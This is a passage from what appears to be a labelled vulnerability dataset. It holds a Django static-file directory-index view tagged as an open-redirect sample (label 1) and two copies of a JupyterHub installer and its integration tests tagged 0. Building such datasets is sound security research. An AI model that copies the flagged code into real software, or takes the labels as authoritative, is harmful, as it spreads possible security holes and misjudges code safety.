  <body>
    <h1>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</h1>
    <ul>
      {% if directory != ""/"" %}
      <li><a href=""../"">../</a></li>
      {% endif %}
      {% for f in file_list %}
      <li><a href=""{{ f|urlencode }}"">{{ f }}</a></li>
      {% endfor %}
    </ul>
  </body>
</html>
""""""
template_translatable = gettext_lazy(""Index of %(directory)s"")


def directory_index(path, fullpath):
    try:
        t = loader.select_template([
            'static/directory_index.html',
            'static/directory_index',
        ])
    except TemplateDoesNotExist:
        t = Engine(libraries={'i18n': 'django.templatetags.i18n'}).from_string(DEFAULT_DIRECTORY_INDEX_TEMPLATE)
    files = []
    for f in os.listdir(fullpath):
        if not f.startswith('.'):
            if os.path.isdir(os.path.join(fullpath, f)):
                f += '/'
            files.append(f)
    c = Context({
        'directory': path + '/',
        'file_list': files,
    })
    return HttpResponse(t.render(c))


def was_modified_since(header=None, mtime=0, size=0):
    """"""
    Was something modified since the user last downloaded it?

    header
      This is the value of the If-Modified-Since header.  If this is None,
      I'll just return True.

    mtime
      This is the modification time of the item we're talking about.

    size
      This is the size of the item we're talking about.
    """"""
    try:
        if header is None:
            raise ValueError
        matches = re.match(r""^([^;]+)(; length=([0-9]+))?$"", header,
                           re.IGNORECASE)
        header_mtime = parse_http_date(matches.group(1))
        header_len = matches.group(3)
        if header_len and int(header_len) != size:
            raise ValueError
        if int(mtime) > header_mtime:
            raise ValueError
    except (AttributeError, ValueError, OverflowError):
        return True
    return False
/n/n/n",1,open_redirect
12,132,d9a4e64dfa2d8ac486aa6364920226f8e0a9072e,"integration-tests/test_extensions.py/n/nimport os
import subprocess


def test_serverextensions():
    """"""
    Validate serverextensions we want are installed
    """"""
    # jupyter-serverextension writes to stdout and stderr weirdly
    proc = subprocess.run([
        '/opt/tljh/user/bin/jupyter-serverextension',
        'list', '--sys-prefix'
    ], stderr=subprocess.PIPE)

    extensions = [
        'jupyterlab 0.35.4',
        'nbgitpuller 0.6.1',
        'nteract_on_jupyter 2.0.7',
        'nbresuse '
    ]

    for e in extensions:
        assert '{} \x1b[32mOK\x1b[0m'.format(e) in proc.stderr.decode()

def test_nbextensions():
    """"""
    Validate nbextensions we want are installed & enabled
    """"""
    # jupyter-nbextension writes to stdout and stderr weirdly
    proc = subprocess.run([
        '/opt/tljh/user/bin/jupyter-nbextension',
        'list', '--sys-prefix'
    ], stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    extensions = [
        'nbresuse/main',
        # This is what ipywidgets nbextension is called
        'jupyter-js-widgets/extension'
    ]

    for e in extensions:
        assert '{} \x1b[32m enabled \x1b[0m'.format(e) in proc.stdout.decode()

    # Ensure we have 'OK' messages in our stdout, to make sure everything is importable
    assert proc.stderr.decode() == '      - Validating: \x1b[32mOK\x1b[0m\n' * len(extensions)


def test_labextensions():
    """"""
    Validate labextensions we want installed
    """"""
    # Currently we only install jupyterhub
    assert os.path.exists('/opt/tljh/user/bin/jupyter-labhub')
/n/n/ntljh/installer.py/n/n""""""Installation logic for TLJH""""""

import argparse
import itertools
import logging
import os
import secrets
import subprocess
import sys
import time
from urllib.error import HTTPError
from urllib.request import urlopen, URLError

import pluggy

from tljh import (
    apt,
    conda,
    hooks,
    migrator,
    systemd,
    traefik,
    user,
)
from .config import (
    CONFIG_DIR,
    CONFIG_FILE,
    HUB_ENV_PREFIX,
    INSTALL_PREFIX,
    STATE_DIR,
    USER_ENV_PREFIX,
)
from .yaml import yaml

HERE = os.path.abspath(os.path.dirname(__file__))


logger = logging.getLogger(""tljh"")

def ensure_node():
    """"""
    Ensure nodejs from nodesource is installed
    """"""
    key = b""""""
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1
Comment: GPGTools - https://gpgtools.org

mQINBFObJLYBEADkFW8HMjsoYRJQ4nCYC/6Eh0yLWHWfCh+/9ZSIj4w/pOe2V6V+
W6DHY3kK3a+2bxrax9EqKe7uxkSKf95gfns+I9+R+RJfRpb1qvljURr54y35IZgs
fMG22Np+TmM2RLgdFCZa18h0+RbH9i0b+ZrB9XPZmLb/h9ou7SowGqQ3wwOtT3Vy
qmif0A2GCcjFTqWW6TXaY8eZJ9BCEqW3k/0Cjw7K/mSy/utxYiUIvZNKgaG/P8U7
89QyvxeRxAf93YFAVzMXhoKxu12IuH4VnSwAfb8gQyxKRyiGOUwk0YoBPpqRnMmD
Dl7SdmY3oQHEJzBelTMjTM8AjbB9mWoPBX5G8t4u47/FZ6PgdfmRg9hsKXhkLJc7
C1btblOHNgDx19fzASWX+xOjZiKpP6MkEEzq1bilUFul6RDtxkTWsTa5TGixgCB/
G2fK8I9JL/yQhDc6OGY9mjPOxMb5PgUlT8ox3v8wt25erWj9z30QoEBwfSg4tzLc
Jq6N/iepQemNfo6Is+TG+JzI6vhXjlsBm/Xmz0ZiFPPObAH/vGCY5I6886vXQ7ft
qWHYHT8jz/R4tigMGC+tvZ/kcmYBsLCCI5uSEP6JJRQQhHrCvOX0UaytItfsQfLm
EYRd2F72o1yGh3yvWWfDIBXRmaBuIGXGpajC0JyBGSOWb9UxMNZY/2LJEwARAQAB
tB9Ob2RlU291cmNlIDxncGdAbm9kZXNvdXJjZS5jb20+iQI4BBMBAgAiBQJTmyS2
AhsDBgsJCAcDAgYVCAIJCgsEFgIDAQIeAQIXgAAKCRAWVaCraFdigHTmD/9OKhUy
jJ+h8gMRg6ri5EQxOExccSRU0i7UHktecSs0DVC4lZG9AOzBe+Q36cym5Z1di6JQ
kHl69q3zBdV3KTW+H1pdmnZlebYGz8paG9iQ/wS9gpnSeEyx0Enyi167Bzm0O4A1
GK0prkLnz/yROHHEfHjsTgMvFwAnf9uaxwWgE1d1RitIWgJpAnp1DZ5O0uVlsPPm
XAhuBJ32mU8S5BezPTuJJICwBlLYECGb1Y65Cil4OALU7T7sbUqfLCuaRKxuPtcU
VnJ6/qiyPygvKZWhV6Od0Yxlyed1kftMJyYoL8kPHfeHJ+vIyt0s7cropfiwXoka
1iJB5nKyt/eqMnPQ9aRpqkm9ABS/r7AauMA/9RALudQRHBdWIzfIg0Mlqb52yyTI
IgQJHNGNX1T3z1XgZhI+Vi8SLFFSh8x9FeUZC6YJu0VXXj5iz+eZmk/nYjUt4Mtc
pVsVYIB7oIDIbImODm8ggsgrIzqxOzQVP1zsCGek5U6QFc9GYrQ+Wv3/fG8hfkDn
xXLww0OGaEQxfodm8cLFZ5b8JaG3+Yxfe7JkNclwvRimvlAjqIiW5OK0vvfHco+Y
gANhQrlMnTx//IdZssaxvYytSHpPZTYw+qPEjbBJOLpoLrz8ZafN1uekpAqQjffI
AOqW9SdIzq/kSHgl0bzWbPJPw86XzzftewjKNbkCDQRTmyS2ARAAxSSdQi+WpPQZ
fOflkx9sYJa0cWzLl2w++FQnZ1Pn5F09D/kPMNh4qOsyvXWlekaV/SseDZtVziHJ
Km6V8TBG3flmFlC3DWQfNNFwn5+pWSB8WHG4bTA5RyYEEYfpbekMtdoWW/Ro8Kmh
41nuxZDSuBJhDeFIp0ccnN2Lp1o6XfIeDYPegyEPSSZqrudfqLrSZhStDlJgXjea
JjW6UP6txPtYaaila9/Hn6vF87AQ5bR2dEWB/xRJzgNwRiax7KSU0xca6xAuf+TD
xCjZ5pp2JwdCjquXLTmUnbIZ9LGV54UZ/MeiG8yVu6pxbiGnXo4Ekbk6xgi1ewLi
vGmz4QRfVklV0dba3Zj0fRozfZ22qUHxCfDM7ad0eBXMFmHiN8hg3IUHTO+UdlX/
aH3gADFAvSVDv0v8t6dGc6XE9Dr7mGEFnQMHO4zhM1HaS2Nh0TiL2tFLttLbfG5o
QlxCfXX9/nasj3K9qnlEg9G3+4T7lpdPmZRRe1O8cHCI5imVg6cLIiBLPO16e0fK
yHIgYswLdrJFfaHNYM/SWJxHpX795zn+iCwyvZSlLfH9mlegOeVmj9cyhN/VOmS3
QRhlYXoA2z7WZTNoC6iAIlyIpMTcZr+ntaGVtFOLS6fwdBqDXjmSQu66mDKwU5Ek
fNlbyrpzZMyFCDWEYo4AIR/18aGZBYUAEQEAAYkCHwQYAQIACQUCU5sktgIbDAAK
CRAWVaCraFdigIPQEACcYh8rR19wMZZ/hgYv5so6Y1HcJNARuzmffQKozS/rxqec
0xM3wceL1AIMuGhlXFeGd0wRv/RVzeZjnTGwhN1DnCDy1I66hUTgehONsfVanuP1
PZKoL38EAxsMzdYgkYH6T9a4wJH/IPt+uuFTFFy3o8TKMvKaJk98+Jsp2X/QuNxh
qpcIGaVbtQ1bn7m+k5Qe/fz+bFuUeXPivafLLlGc6KbdgMvSW9EVMO7yBy/2JE15
ZJgl7lXKLQ31VQPAHT3an5IV2C/ie12eEqZWlnCiHV/wT+zhOkSpWdrheWfBT+ac
hR4jDH80AS3F8jo3byQATJb3RoCYUCVc3u1ouhNZa5yLgYZ/iZkpk5gKjxHPudFb
DdWjbGflN9k17VCf4Z9yAb9QMqHzHwIGXrb7ryFcuROMCLLVUp07PrTrRxnO9A/4
xxECi0l/BzNxeU1gK88hEaNjIfviPR/h6Gq6KOcNKZ8rVFdwFpjbvwHMQBWhrqfu
G3KaePvbnObKHXpfIKoAM7X2qfO+IFnLGTPyhFTcrl6vZBTMZTfZiC1XDQLuGUnd
sckuXINIU3DFWzZGr0QrqkuE/jyr7FXeUJj9B7cLo+s/TXo+RaVfi3kOc9BoxIvy
/qiNGs/TKy2/Ujqp/affmIMoMXSozKmga81JSwkADO1JMgUy6dApXz9kP4EE3g==
=CLGF
-----END PGP PUBLIC KEY BLOCK-----
    """""".strip()
    apt.trust_gpg_key(key)
    apt.add_source('nodesource', 'https://deb.nodesource.com/node_10.x', 'main')
    apt.install_packages(['nodejs'])

def remove_chp():
    """"""
    Ensure CHP is not running
    """"""
    if os.path.exists(""/etc/systemd/system/configurable-http-proxy.service""):
        if systemd.check_service_active('configurable-http-proxy.service'):
            try:
                systemd.stop_service('configurable-http-proxy.service')
            except subprocess.CalledProcessError:
                logger.info(""Cannot stop configurable-http-proxy..."")
        if systemd.check_service_enabled('configurable-http-proxy.service'):
            try:
                systemd.disable_service('configurable-http-proxy.service')
            except subprocess.CalledProcessError:
                logger.info(""Cannot disable configurable-http-proxy..."")
        try:
            systemd.uninstall_unit('configurable-http-proxy.service')
        except subprocess.CalledProcessError:
            logger.info(""Cannot uninstall configurable-http-proxy..."")


def ensure_jupyterhub_service(prefix):
    """"""
    Ensure JupyterHub Services are set up properly
    """"""

    os.makedirs(STATE_DIR, mode=0o700, exist_ok=True)

    remove_chp()
    systemd.reload_daemon()

    with open(os.path.join(HERE, 'systemd-units', 'jupyterhub.service')) as f:
        hub_unit_template = f.read()


    with open(os.path.join(HERE, 'systemd-units', 'traefik.service')) as f:
        traefik_unit_template = f.read()

    #Set up proxy / hub secret token if it is not already setup
    proxy_secret_path = os.path.join(STATE_DIR, 'traefik-api.secret')
    if not os.path.exists(proxy_secret_path):
        with open(proxy_secret_path, 'w') as f:
            f.write(secrets.token_hex(32))

    traefik.ensure_traefik_config(STATE_DIR)

    unit_params = dict(
        python_interpreter_path=sys.executable,
        jupyterhub_config_path=os.path.join(HERE, 'jupyterhub_config.py'),
        install_prefix=INSTALL_PREFIX,
    )
    systemd.install_unit('jupyterhub.service', hub_unit_template.format(**unit_params))
    systemd.install_unit('traefik.service', traefik_unit_template.format(**unit_params))
    systemd.reload_daemon()

    # If JupyterHub is running, we want to restart it.
    systemd.restart_service('jupyterhub')
    systemd.restart_service('traefik')

    # Mark JupyterHub & traefik to start at boot time
    systemd.enable_service('jupyterhub')
    systemd.enable_service('traefik')


def ensure_jupyterlab_extensions():
    """"""
    Install the JupyterLab extensions we want.
    """"""
    extensions = [
        '@jupyterlab/hub-extension',
        '@jupyter-widgets/jupyterlab-manager'
    ]
    subprocess.check_output([
        os.path.join(USER_ENV_PREFIX, 'bin/jupyter'),
        'labextension',
        'install'
    ] + extensions)


def ensure_jupyterhub_package(prefix):
    """"""
    Install JupyterHub into our conda environment if needed.

    We install all python packages from PyPI as much as possible in the
    hub environment. A lot of spawners & authenticators do not have conda-forge
    packages, but do have pip packages. Keeping all python packages in the
    hub environment be installed with pip prevents accidental mixing of python
    and conda packages!
    """"""
    conda.ensure_pip_packages(prefix, [
        'jupyterhub==0.9.5',
        'jupyterhub-dummyauthenticator==0.3.1',
        'jupyterhub-systemdspawner==0.11',
        'jupyterhub-firstuseauthenticator==0.12',
        'jupyterhub-nativeauthenticator==0.0.4',
        'jupyterhub-ldapauthenticator==1.2.2',
        'oauthenticator==0.8.1'
    ])
    traefik.ensure_traefik_binary(prefix)


def ensure_usergroups():
    """"""
    Sets up user groups & sudo rules
    """"""
    user.ensure_group('jupyterhub-admins')
    user.ensure_group('jupyterhub-users')

    logger.info(""Granting passwordless sudo to JupyterHub admins..."")
    with open('/etc/sudoers.d/jupyterhub-admins', 'w') as f:
        # JupyterHub admins should have full passwordless sudo access
        f.write('%jupyterhub-admins ALL = (ALL) NOPASSWD: ALL\n')
        # `sudo -E` should preserve the $PATH we set. This allows
        # admins in jupyter terminals to do `sudo -E pip install <package>`,
        # `pip` is in the $PATH we set in jupyterhub_config.py to include the user conda env.
        f.write('Defaults exempt_group = jupyterhub-admins\n')


def ensure_user_environment(user_requirements_txt_file):
    """"""
    Set up user conda environment with required packages
    """"""
    logger.info(""Setting up user environment..."")
    miniconda_version = '4.5.4'
    miniconda_installer_md5 = ""a946ea1d0c4a642ddf0c3a26a18bb16d""

    if not conda.check_miniconda_version(USER_ENV_PREFIX, miniconda_version):
        logger.info('Downloading & setting up user environment...')
        with conda.download_miniconda_installer(miniconda_version, miniconda_installer_md5) as installer_path:
            conda.install_miniconda(installer_path, USER_ENV_PREFIX)

    # nbresuse needs psutil, which requires gcc
    apt.install_packages([
        'gcc'
    ])

    conda.ensure_conda_packages(USER_ENV_PREFIX, [
        # Conda's latest version is on conda much more so than on PyPI.
        'conda==4.5.8'
    ])

    conda.ensure_pip_packages(USER_ENV_PREFIX, [
        # JupyterHub + notebook package are base requirements for user environment
        'jupyterhub==0.9.5',
        'notebook==5.7.7',
        # Install additional notebook frontends!
        'jupyterlab==0.35.4',
        'nteract-on-jupyter==2.0.7',
        # nbgitpuller for easily pulling in Git repositories
        'nbgitpuller==0.6.1',
        # nbresuse to show people how much RAM they are using
        'nbresuse==0.3.0',
        # Most people consider ipywidgets to be part of the core notebook experience
        'ipywidgets==7.4.2',
        # Pin tornado
        'tornado<6.0'
    ])

    if user_requirements_txt_file:
        # FIXME: This currently fails hard, should fail soft and not abort installer
        conda.ensure_pip_requirements(USER_ENV_PREFIX, user_requirements_txt_file)


def ensure_admins(admins):
    """"""
    Setup given list of users as admins.
    """"""
    if not admins:
        return
    logger.info(""Setting up admin users"")
    config_path = CONFIG_FILE
    if os.path.exists(config_path):
        with open(config_path, 'r') as f:
            config = yaml.load(f)
    else:
        config = {}

    config['users'] = config.get('users', {})
    config['users']['admin'] = list(admins)

    with open(config_path, 'w+') as f:
        yaml.dump(config, f)


def ensure_jupyterhub_running(times=20):
    """"""
    Ensure that JupyterHub is up and running

    Loops given number of times, waiting a second each.
    """"""

    for i in range(times):
        try:
            logger.info('Waiting for JupyterHub to come up ({}/{} tries)'.format(i + 1, times))
            urlopen('http://127.0.0.1')
            return
        except HTTPError as h:
            if h.code in [404, 502, 503]:
                # May be transient
                time.sleep(1)
                continue
            # Everything else should immediately abort
            raise
        except URLError as e:
            if isinstance(e.reason, ConnectionRefusedError):
                # Hub isn't up yet, sleep & loop
                time.sleep(1)
                continue
            # Everything else should immediately abort
            raise

    raise Exception(""Installation failed: JupyterHub did not start in {}s"".format(times))


def ensure_symlinks(prefix):
    """"""
    Ensure we symlink appropriate things into /usr/bin

    We add the user conda environment to PATH for notebook terminals,
    but not the hub venv. This means tljh-config is not actually accessible.

    We symlink to /usr/bin and not /usr/local/bin, since /usr/local/bin is
    not place, and works with sudo -E in sudo's search $PATH. We can work
    around this with sudo -E and extra entries in the sudoers file, but this
    is far more secure at the cost of upsetting some FHS purists.
    """"""
    tljh_config_src = os.path.join(prefix, 'bin', 'tljh-config')
    tljh_config_dest = '/usr/bin/tljh-config'
    if os.path.exists(tljh_config_dest):
        if os.path.realpath(tljh_config_dest) != tljh_config_src:
            #  tljh-config exists that isn't ours. We should *not* delete this file,
            # instead we throw an error and abort. Deleting files owned by other people
            # while running as root is dangerous, especially with symlinks involved.
            raise FileExistsError(f'/usr/bin/tljh-config exists but is not a symlink to {tljh_config_src}')
        else:
            # We have a working symlink, so do nothing
            return
    os.symlink(tljh_config_src, tljh_config_dest)


def setup_plugins(plugins=None):
    """"""
    Install plugins & setup a pluginmanager
    """"""
    # Install plugins
    if plugins:
        conda.ensure_pip_packages(HUB_ENV_PREFIX, plugins)

    # Set up plugin infrastructure
    pm = pluggy.PluginManager('tljh')
    pm.add_hookspecs(hooks)
    pm.load_setuptools_entrypoints('tljh')

    return pm


def run_plugin_actions(plugin_manager, plugins):
    """"""
    Run installer hooks defined in plugins
    """"""
    hook = plugin_manager.hook
    # Install apt packages
    apt_packages = list(set(itertools.chain(*hook.tljh_extra_apt_packages())))
    if apt_packages:
        logger.info('Installing {} apt packages collected from plugins: {}'.format(
            len(apt_packages), ' '.join(apt_packages)
        ))
        apt.install_packages(apt_packages)

    # Install conda packages
    conda_packages = list(set(itertools.chain(*hook.tljh_extra_user_conda_packages())))
    if conda_packages:
        logger.info('Installing {} conda packages collected from plugins: {}'.format(
            len(conda_packages), ' '.join(conda_packages)
        ))
        conda.ensure_conda_packages(USER_ENV_PREFIX, conda_packages)

    # Install pip packages
    pip_packages = list(set(itertools.chain(*hook.tljh_extra_user_pip_packages())))
    if pip_packages:
        logger.info('Installing {} pip packages collected from plugins: {}'.format(
            len(pip_packages), ' '.join(pip_packages)
        ))
        conda.ensure_pip_packages(USER_ENV_PREFIX, pip_packages)


def ensure_config_yaml(plugin_manager):
    """"""
    Ensure we have a config.yaml present
    """"""
    # ensure config dir exists and is private
    for path in [CONFIG_DIR, os.path.join(CONFIG_DIR, 'jupyterhub_config.d')]:
        os.makedirs(path, mode=0o700, exist_ok=True)

    migrator.migrate_config_files()

    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = yaml.load(f)
    else:
        config = {}

    hook = plugin_manager.hook
    hook.tljh_config_post_install(config=config)

    with open(CONFIG_FILE, 'w+') as f:
        yaml.dump(config, f)


def main():
    from .log import init_logging
    init_logging()

    argparser = argparse.ArgumentParser()
    argparser.add_argument(
        '--admin',
        nargs='*',
        help='List of usernames set to be admin'
    )
    argparser.add_argument(
        '--user-requirements-txt-url',
        help='URL to a requirements.txt file that should be installed in the user enviornment'
    )
    argparser.add_argument(
        '--plugin',
        nargs='*',
        help='Plugin pip-specs to install'
    )

    args = argparser.parse_args()

    pm = setup_plugins(args.plugin)

    ensure_config_yaml(pm)
    ensure_admins(args.admin)
    ensure_usergroups()
    ensure_user_environment(args.user_requirements_txt_url)

    logger.info(""Setting up JupyterHub..."")
    ensure_node()
    ensure_jupyterhub_package(HUB_ENV_PREFIX)
    ensure_jupyterlab_extensions()
    ensure_jupyterhub_service(HUB_ENV_PREFIX)
    ensure_jupyterhub_running()
    ensure_symlinks(HUB_ENV_PREFIX)

    # Run installer plugins last
    run_plugin_actions(pm, args.plugin)

    logger.info(""Done!"")


if __name__ == '__main__':
    main()
/n/n/n",0,open_redirect
13,133,d9a4e64dfa2d8ac486aa6364920226f8e0a9072e,"/integration-tests/test_extensions.py/n/nimport os
import subprocess


def test_serverextensions():
    """"""
    Validate serverextensions we want are installed
    """"""
    # jupyter-serverextension writes to stdout and stderr weirdly
    proc = subprocess.run([
        '/opt/tljh/user/bin/jupyter-serverextension',
        'list', '--sys-prefix'
    ], stderr=subprocess.PIPE)

    extensions = [
        'jupyterlab 0.35.3',
        'nbgitpuller 0.6.1',
        'nteract_on_jupyter 1.9.12',
        'nbresuse '
    ]

    for e in extensions:
        assert '{} \x1b[32mOK\x1b[0m'.format(e) in proc.stderr.decode()

def test_nbextensions():
    """"""
    Validate nbextensions we want are installed & enabled
    """"""
    # jupyter-nbextension writes to stdout and stderr weirdly
    proc = subprocess.run([
        '/opt/tljh/user/bin/jupyter-nbextension',
        'list', '--sys-prefix'
    ], stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    extensions = [
        'nbresuse/main',
        # This is what ipywidgets nbextension is called
        'jupyter-js-widgets/extension'
    ]

    for e in extensions:
        assert '{} \x1b[32m enabled \x1b[0m'.format(e) in proc.stdout.decode()

    # Ensure we have 'OK' messages in our stdout, to make sure everything is importable
    assert proc.stderr.decode() == '      - Validating: \x1b[32mOK\x1b[0m\n' * len(extensions)


def test_labextensions():
    """"""
    Validate labextensions we want installed
    """"""
    # Currently we only install jupyterhub
    assert os.path.exists('/opt/tljh/user/bin/jupyter-labhub')
/n/n/n/tljh/installer.py/n/n""""""Installation logic for TLJH""""""

import argparse
import itertools
import logging
import os
import secrets
import subprocess
import sys
import time
from urllib.error import HTTPError
from urllib.request import urlopen, URLError

import pluggy

from tljh import (
    apt,
    conda,
    hooks,
    migrator,
    systemd,
    traefik,
    user,
)
from .config import (
    CONFIG_DIR,
    CONFIG_FILE,
    HUB_ENV_PREFIX,
    INSTALL_PREFIX,
    STATE_DIR,
    USER_ENV_PREFIX,
)
from .yaml import yaml

HERE = os.path.abspath(os.path.dirname(__file__))


logger = logging.getLogger(""tljh"")

def ensure_node():
    """"""
    Ensure nodejs from nodesource is installed
    """"""
    key = b""""""
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1
Comment: GPGTools - https://gpgtools.org

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
=CLGF
-----END PGP PUBLIC KEY BLOCK-----
    """""".strip()
    apt.trust_gpg_key(key)
    apt.add_source('nodesource', 'https://deb.nodesource.com/node_10.x', 'main')
    apt.install_packages(['nodejs'])

def remove_chp():
    """"""
    Ensure CHP is not running
    """"""
    if os.path.exists(""/etc/systemd/system/configurable-http-proxy.service""):
        if systemd.check_service_active('configurable-http-proxy.service'):
            try:
                systemd.stop_service('configurable-http-proxy.service')
            except subprocess.CalledProcessError:
                logger.info(""Cannot stop configurable-http-proxy..."")
        if systemd.check_service_enabled('configurable-http-proxy.service'):
            try:
                systemd.disable_service('configurable-http-proxy.service')
            except subprocess.CalledProcessError:
                logger.info(""Cannot disable configurable-http-proxy..."")
        try:
            systemd.uninstall_unit('configurable-http-proxy.service')
        except subprocess.CalledProcessError:
            logger.info(""Cannot uninstall configurable-http-proxy..."")


def ensure_jupyterhub_service(prefix):
    """"""
    Ensure JupyterHub Services are set up properly
    """"""

    os.makedirs(STATE_DIR, mode=0o700, exist_ok=True)

    remove_chp()
    systemd.reload_daemon()

    with open(os.path.join(HERE, 'systemd-units', 'jupyterhub.service')) as f:
        hub_unit_template = f.read()


    with open(os.path.join(HERE, 'systemd-units', 'traefik.service')) as f:
        traefik_unit_template = f.read()

    #Set up proxy / hub secret token if it is not already setup
    proxy_secret_path = os.path.join(STATE_DIR, 'traefik-api.secret')
    if not os.path.exists(proxy_secret_path):
        with open(proxy_secret_path, 'w') as f:
            f.write(secrets.token_hex(32))

    traefik.ensure_traefik_config(STATE_DIR)

    unit_params = dict(
        python_interpreter_path=sys.executable,
        jupyterhub_config_path=os.path.join(HERE, 'jupyterhub_config.py'),
        install_prefix=INSTALL_PREFIX,
    )
    systemd.install_unit('jupyterhub.service', hub_unit_template.format(**unit_params))
    systemd.install_unit('traefik.service', traefik_unit_template.format(**unit_params))
    systemd.reload_daemon()

    # If JupyterHub is running, we want to restart it.
    systemd.restart_service('jupyterhub')
    systemd.restart_service('traefik')

    # Mark JupyterHub & traefik to start at boot time
    systemd.enable_service('jupyterhub')
    systemd.enable_service('traefik')


def ensure_jupyterlab_extensions():
    """"""
    Install the JupyterLab extensions we want.
    """"""
    extensions = [
        '@jupyterlab/hub-extension',
        '@jupyter-widgets/jupyterlab-manager'
    ]
    subprocess.check_output([
        os.path.join(USER_ENV_PREFIX, 'bin/jupyter'),
        'labextension',
        'install'
    ] + extensions)


